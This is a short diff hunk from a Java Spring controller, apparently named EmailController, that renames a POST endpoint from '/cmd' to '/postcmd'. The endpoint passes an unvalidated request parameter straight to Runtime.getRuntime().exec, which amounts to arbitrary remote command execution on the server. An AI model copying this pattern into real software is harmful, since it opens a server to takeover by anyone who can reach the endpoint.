@@ -106,7 +106,7 @@ public class EmailController {
 		return arg;
 	}
 
-	@PostMapping("/cmd")
+	@PostMapping("/postcmd")
 	public String postCMD(@RequestParam String arg) throws IOException {
 		StringBuilder result = new StringBuilder();
 		Process process = Runtime.getRuntime().exec(arg);
